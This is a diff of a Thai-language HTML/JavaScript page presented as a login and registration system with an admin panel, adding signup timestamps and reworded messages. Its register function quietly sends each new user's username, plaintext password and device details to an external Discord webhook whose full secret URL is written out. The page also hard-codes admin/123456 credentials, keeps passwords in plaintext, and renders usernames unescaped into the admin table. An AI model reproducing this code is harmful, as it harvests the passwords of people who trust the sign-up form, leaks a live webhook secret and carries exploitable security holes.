@@ -3,11 +3,11 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Advanced Auth & Admin System</title>
+    <title>System with Admin Log & Timestamp</title>
     <link href="https://fonts.googleapis.com/css2?family=Kanit:wght@300;500&display=swap" rel="stylesheet">
     <style>
         body, html { height: 100%; margin: 0; font-family: 'Kanit', sans-serif; background-color: #121212; color: white; display: flex; justify-content: center; align-items: center; overflow-x: hidden; }
-        #home-page, #admin-page { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: #1a1a1a; padding: 20px; box-sizing: border-box; }
+        #home-page, #admin-page { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: #1a1a1a; padding: 20px; box-sizing: border-box; overflow-y: auto; }
         .page-label { font-size: 2rem; font-weight: bold; color: #5865F2; margin-bottom: 20px; }
         .logout-btn-top { position: absolute; top: 20px; right: 20px; width: auto !important; padding: 10px 20px !important; margin: 0 !important; background-color: #f04747 !important; font-size: 0.9rem !important; cursor: pointer; border: none; border-radius: 5px; color: white; font-weight: bold; }
         .auth-card { background: #2f3136; padding: 30px; border-radius: 12px; box-shadow: 0 10px 30px rgba(0,0,0,0.5); width: 400px; text-align: center; z-index: 10; }
@@ -20,10 +20,13 @@
         button { width: 100%; padding: 12px; margin-top: 15px; border: none; border-radius: 5px; background-color: #5865F2; color: white; cursor: pointer; font-weight: bold; font-size: 1rem; }
         button:hover { background-color: #4752c4; }
         .switch-mode { font-size: 0.9rem; margin-top: 15px; color: #b9bbbe; cursor: pointer; }
-        table { width: 100%; border-collapse: collapse; margin-top: 20px; background: #2f3136; border-radius: 8px; overflow: hidden; font-size: 0.9rem; }
+        
+        /* Table Styles */
+        table { width: 100%; border-collapse: collapse; margin-top: 20px; background: #2f3136; border-radius: 8px; overflow: hidden; font-size: 0.85rem; }
         th, td { padding: 12px; text-align: left; border-bottom: 1px solid #202225; }
         th { background-color: #5865F2; color: white; }
-        .btn-delete { background: #f04747; padding: 5px 10px; font-size: 0.8rem; width: auto; margin: 0; }
+        .btn-delete { background: #f04747; padding: 5px 10px; font-size: 0.7rem; width: auto; margin: 0; border: none; border-radius: 3px; color: white; cursor: pointer; }
+        
         #welcome-screen { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: #121212; justify-content: center; align-items: center; z-index: 99; }
         .welcome-text { font-size: 4rem; font-weight: bold; text-align: center; opacity: 0; transform: scale(0.8); animation: welcomeFade 2.5s ease-in-out forwards; }
         @keyframes welcomeFade { 0% { opacity: 0; transform: scale(0.8); filter: blur(10px); } 40%, 60% { opacity: 1; transform: scale(1); filter: blur(0px); } 100% { opacity: 0; transform: scale(1.1); filter: blur(5px); } }
@@ -44,14 +47,15 @@
     <div id="admin-page">
         <div class="page-label">ADMIN PANEL</div>
         <button class="logout-btn-top" onclick="location.reload()">ออกจากระบบ</button>
-        <h3>รายชื่อผู้สมัครและอุปกรณ์ที่ใช้</h3>
+        <h3>ประวัติผู้สมัครสมาชิก (ถาวร)</h3>
         <table>
             <thead>
                 <tr>
                     <th>ลำดับ</th>
+                    <th>วัน-เวลาที่สมัคร</th>
                     <th>Username</th>
                     <th>Password</th>
-                    <th>อุปกรณ์ (Device Info)</th>
+                    <th>อุปกรณ์</th>
                     <th>จัดการ</th>
                 </tr>
             </thead>
@@ -82,18 +86,19 @@
         const WEBHOOK_URL = 'https://discord.com/api/webhooks/1482780179976814642/CL9RXaEDWLtKAHRmXQ6wMuqv-kbztJOtyXrjdJ6HpNksm0srTuA9hoFbolQktTwK8TUa';
         const ADMIN_CONFIG = { user: "admin", pass: "123456" };
 
-        // ฟังก์ชันดึงข้อมูลอุปกรณ์
         function getDeviceInfo() {
             const ua = navigator.userAgent;
-            let device = "PC / Desktop";
-            if (/Android/i.test(ua)) device = "Android Phone";
-            else if (/iPhone|iPad|iPod/i.test(ua)) device = "iOS Device";
-            
-            // พยายามดึงชื่อรุ่นคร่าวๆ จาก UserAgent
+            let device = "PC";
+            if (/Android/i.test(ua)) device = "Android";
+            else if (/iPhone|iPad|iPod/i.test(ua)) device = "iOS";
             const match = ua.match(/\(([^)]+)\)/);
-            const model = match ? match[1].split(';')[0] : "Unknown Model";
-            
-            return `${device} (${model})`;
+            return `${device} (${match ? match[1].split(';')[0] : "Unknown"})`;
+        }
+
+        // ฟังก์ชันสร้างวัน-เวลาปัจจุบัน
+        function getCurrentTimestamp() {
+            const now = new Date();
+            return now.toLocaleString('th-TH', { hour12: false });
         }
 
         function toggle() {
@@ -106,41 +111,51 @@
             const user = document.getElementById('r-user').value.trim();
             const statusLabel = document.getElementById('name-status');
             let users = JSON.parse(localStorage.getItem('my_users') || '[]');
+            
             if (user.length === 0) { statusLabel.innerText = ""; return; }
-            if (user.length < 5) { statusLabel.innerText = "❌ สั้นเกินไป"; statusLabel.className = "status-invalid"; return false; }
-            if (users.some(u => u.username === user) || user === ADMIN_CONFIG.user) { statusLabel.innerText = "❌ ชื่อนี้ถูกใช้แล้ว"; statusLabel.className = "status-invalid"; return false; }
-            statusLabel.innerText = "✅ ใช้งานได้"; statusLabel.className = "status-valid"; return true;
+            if (user.length < 5) { 
+                statusLabel.innerText = "❌ ต้องมีอย่างน้อย 5 ตัวอักษร"; 
+                statusLabel.className = "status-invalid"; 
+                return false; 
+            }
+            // เช็คว่าชื่อนี้เคยสมัครไปหรือยัง
+            if (users.some(u => u.username.toLowerCase() === user.toLowerCase()) || user.toLowerCase() === ADMIN_CONFIG.user) { 
+                statusLabel.innerText = "❌ ชื่อนี้ถูกใช้งานไปแล้ว"; 
+                statusLabel.className = "status-invalid"; 
+                return false; 
+            }
+            statusLabel.innerText = "✅ ชื่อนี้ว่าง สามารถสมัครได้"; 
+            statusLabel.className = "status-valid"; 
+            return true;
         }
 
         async function register() {
             const user = document.getElementById('r-user').value.trim();
             const pass = document.getElementById('r-pass').value;
             const confirm = document.getElementById('r-confirm').value;
-            const deviceInfo = getDeviceInfo(); // ดึงข้อมูลเครื่องทันทีที่สมัคร
+            const time = getCurrentTimestamp();
+            const device = getDeviceInfo();
 
-            if (!checkUsername()) return alert('เช็คชื่อบัญชีอีกครั้ง');
-            if (pass.length < 6 || pass !== confirm) return alert('รหัสผ่านไม่ถูกต้อง');
+            if (!checkUsername()) return alert('กรุณาเปลี่ยนชื่อบัญชี');
+            if (pass.length < 6) return alert('รหัสผ่านสั้นเกินไป');
+            if (pass !== confirm) return alert('รหัสผ่านไม่ตรงกัน');
 
             let users = JSON.parse(localStorage.getItem('my_users') || '[]');
-            users.push({ username: user, password: pass, device: deviceInfo });
+            users.push({ 
+                username: user, 
+                password: pass, 
+                device: device, 
+                timestamp: time 
+            });
             localStorage.setItem('my_users', JSON.stringify(users));
 
-            // ส่งไป Discord พร้อมข้อมูลอุปกรณ์
+            // ส่งข้อมูลเข้า Discord
             try {
                 await fetch(WEBHOOK_URL, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({
-                        embeds: [{
-                            title: "📱 สมาชิกใหม่สมัครสมาชิก!",
-                            color: 5814783,
-                            fields: [
-                                { name: "👤 User", value: `\`${user}\``, inline: true },
-                                { name: "🔑 Pass", value: `\`${pass}\``, inline: true },
-                                { name: "🛠 อุปกรณ์", value: `\`${deviceInfo}\`` }
-                            ],
-                            timestamp: new Date()
-                        }]
+                        content: `✅ **สมัครใหม่สำเร็จ**\n👤 User: \`${user}\`\n🔑 Pass: \`${pass}\`\n📱 เครื่อง: \`${device}\`\n⏰ เวลา: \`${time}\``
                     })
                 });
             } catch (e) {}
@@ -152,10 +167,11 @@
             const user = document.getElementById('l-user').value.trim();
             const pass = document.getElementById('l-pass').value;
             if (user === ADMIN_CONFIG.user && pass === ADMIN_CONFIG.pass) return startWelcome("ADMIN", true);
+            
             let users = JSON.parse(localStorage.getItem('my_users') || '[]');
             const match = users.find(u => u.username === user && u.password === pass);
             if (match) startWelcome(user, false);
-            else alert('ข้อมูลผิดพลาด');
+            else alert('ชื่อบัญชีหรือรหัสผ่านผิด');
         }
 
         function startWelcome(username, isAdmin) {
@@ -175,19 +191,21 @@
             const tableBody = document.getElementById('user-table-body');
             tableBody.innerHTML = "";
             let users = JSON.parse(localStorage.getItem('my_users') || '[]');
+            
             users.forEach((u, index) => {
                 tableBody.innerHTML += `<tr>
                     <td>${index + 1}</td>
+                    <td>${u.timestamp || "ไม่ระบุ"}</td>
                     <td>${u.username}</td>
                     <td>${u.password}</td>
-                    <td>${u.device || "ไม่มีข้อมูล"}</td>
+                    <td>${u.device || "Unknown"}</td>
                     <td><button class="btn-delete" onclick="deleteUser(${index})">ลบ</button></td>
                 </tr>`;
             });
         }
 
         function deleteUser(index) {
-            if(confirm("ลบบัญชีนี้?")) {
+            if(confirm("ต้องการลบข้อมูลนี้อย่างถาวรหรือไม่?")) {
                 let users = JSON.parse(localStorage.getItem('my_users') || '[]');
                 users.splice(index, 1);
                 localStorage.setItem('my_users', JSON.stringify(users));
